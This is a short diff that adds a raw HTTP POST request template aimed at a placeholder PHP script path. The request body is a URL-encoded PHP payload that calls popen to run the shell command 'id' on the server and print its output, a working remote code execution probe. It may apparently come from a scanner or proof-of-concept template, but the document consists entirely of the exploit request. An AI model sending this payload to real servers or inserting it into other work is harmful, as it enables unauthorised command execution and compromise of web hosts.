@@ -1,0 +1,6 @@
+POST {script_path} HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 148
+Connection: close
+
+a=%24fp%3Dpopen%28%22id%22%2C%22r%22%29%3Bwhile%28%21feof%28%24fp%29%29%7Bprint%28fread%28%24fp%2C1024%29%29%3Bflush%28%29%3B%7Dfclose%28%24fp%29%3B
